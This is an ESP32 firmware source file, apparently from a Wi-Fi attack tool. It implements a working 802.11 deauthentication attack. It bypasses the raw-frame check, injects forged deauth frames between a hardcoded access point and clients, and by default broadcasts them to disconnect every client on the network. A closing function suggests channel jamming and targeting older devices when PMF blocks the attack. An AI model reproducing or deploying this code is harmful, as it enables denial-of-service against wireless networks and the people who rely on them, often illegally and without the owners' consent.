#include "DeauthAttack.h"
#include "common/SharedState.h"
#include "wsl_bypasser/wsl_bypasser.h"
#include <string.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char* TAG = "DeauthAttack";

extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool enq);

// Target configuration
static uint8_t target_ap[6] = {0x6E, 0xC7, 0xEC, 0x24, 0x65, 0x3A};  // Your router
static uint8_t target_client[6] = {0xA8, 0x7E, 0xEA, 0xB3, 0x99, 0x4E};  // Device to deauth

// Deauth frame template
// static uint8_t deauth_frame[26] = {
//     0xC0, 0x00,                         // Frame Control: Deauth (type=0, subtype=12)
//     0x00, 0x00,                         // Duration
//     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
//     0x00, 0x00,                         // Sequence number
//     0x07, 0x00                          // Reason code
// };

// Deauth frame template
static const uint8_t deauth_frame[] = {
    0xC0, 0x00,                         // Frame Control: Deauth (type=0, subtype=12)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code
};

static bool wifi_was_promiscuous = false;
static wifi_mode_t original_mode = WIFI_MODE_NULL;
static uint8_t attack_channel = 11;

// Save current WiFi state and switch to AP mode for packet injection
static void prepare_for_injection(void) {
    // Save current state
    esp_wifi_get_mode(&original_mode);
    wifi_was_promiscuous = false;
    
    // Check if promiscuous mode was enabled
    esp_wifi_get_promiscuous(&wifi_was_promiscuous);
    
    // Disable promiscuous mode
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(false);
        ESP_LOGI(TAG, "Promiscuous mode disabled");
    }
    
    // Set to AP mode for packet injection
    esp_wifi_set_mode(WIFI_MODE_AP);
    
    // Set channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi switched to AP mode for injection");
    vTaskDelay(pdMS_TO_TICKS(100));  // Let WiFi stabilize
}

// Restore original WiFi state
static void restore_wifi_state(void) {
    // Restore original mode
    esp_wifi_set_mode(original_mode);
    
    // Re-enable promiscuous mode if it was on
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(true);
        ESP_LOGI(TAG, "Promiscuous mode re-enabled");
    }
    
    // Restore channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi state restored");
}

void send_deauth_packets(const uint8_t *ap_mac, const uint8_t *client_mac, int count) {
    ESP_LOGI(TAG, "Sending %d deauth bursts on channel %d", count, attack_channel);
    ESP_LOGI(TAG, "AP: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
    ESP_LOGI(TAG, "Client: %02X:%02X:%02X:%02X:%02X:%02X",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    // Prepare WiFi for injection
    prepare_for_injection();

    uint8_t packet[26];
    esp_err_t ret;
    int success_count = 0;
    int retry_count = 0;
    const int MAX_RETRIES = 5;
    
    for (int i = 0; i < count; i++) {
        // Send burst of 3 packets with retries on failure
        for (int burst = 0; burst < 3; burst++) {
            // ===== AP -> Client deauth =====
            memcpy(packet, deauth_frame, sizeof(deauth_frame));
            memcpy(&packet[4], client_mac, 6);   // Destination: CLIENT
            memcpy(&packet[10], ap_mac, 6);      // Source: AP
            memcpy(&packet[16], ap_mac, 6);      // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    // TX buffer full, wait for it to drain
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            // Small delay between packets in burst
            vTaskDelay(pdMS_TO_TICKS(5));
            
            // ===== Client -> AP deauth =====
            memcpy(&packet[4], ap_mac, 6);       // Destination: AP
            memcpy(&packet[10], client_mac, 6);  // Source: CLIENT
            memcpy(&packet[16], ap_mac, 6);      // BSSID: AP
            
            retry_count = 0;
            do {
                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
                if (ret == ESP_OK) {
                    success_count++;
                    break;
                } else if (ret == ESP_ERR_NO_MEM) {
                    vTaskDelay(pdMS_TO_TICKS(50));
                    retry_count++;
                } else {
                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
                    break;
                }
            } while (retry_count < MAX_RETRIES);
            
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        
        // Longer delay between bursts to let buffers clear
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Log progress every 10 bursts
        if ((i + 1) % 10 == 0) {
            ESP_LOGI(TAG, "Progress: %d/%d bursts, %d packets sent", 
                     i + 1, count, success_count);
        }
    }

    // Handle attackInProgress variable for blinking
    isAttackActive = false;
    
    ESP_LOGI(TAG, "Attack complete: %d/%d packets sent successfully", 
             success_count, count * 6);  // 3 bursts × 2 directions

    
    // Restore original WiFi state
    vTaskDelay(pdMS_TO_TICKS(100));
    restore_wifi_state();
}

void start_deauth_attack(int packet_count) {
    // send_deauth_packets(target_ap, target_client, packet_count);

    // Try broadcast first (kicks all clients)
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    ESP_LOGI(TAG, "Attempting broadcast deauth first...");
    send_deauth_packets(target_ap, broadcast, packet_count / 2);
    
    vTaskDelay(pdMS_TO_TICKS(500));
    
    // ESP_LOGI(TAG, "Now targeting specific client...");
    // send_deauth_packets(target_ap, target_client, packet_count / 2);
}

void set_deauth_targets(const uint8_t *ap, const uint8_t *client) {
    if (ap) memcpy(target_ap, ap, 6);
    if (client) memcpy(target_client, client, 6);
    
    ESP_LOGI(TAG, "Deauth targets updated");
}

void set_deauth_channel(uint8_t channel) {
    attack_channel = channel;
    ESP_LOGI(TAG, "Deauth channel set to %d", channel);
}

void test_pmf_protection(void) {
    ESP_LOGI(TAG, "Testing for 802.11w PMF protection...");
    ESP_LOGI(TAG, "If deauth doesn't work, target likely has PMF enabled");
    ESP_LOGI(TAG, "PMF makes deauth attacks ineffective");
    ESP_LOGI(TAG, "Alternatives:");
    ESP_LOGI(TAG, "  1. Jam the WiFi channel (illegal in most places)");
    ESP_LOGI(TAG, "  2. Target older devices without PMF support");
    ESP_LOGI(TAG, "  3. Perform disassociation attacks (also blocked by PMF)");
}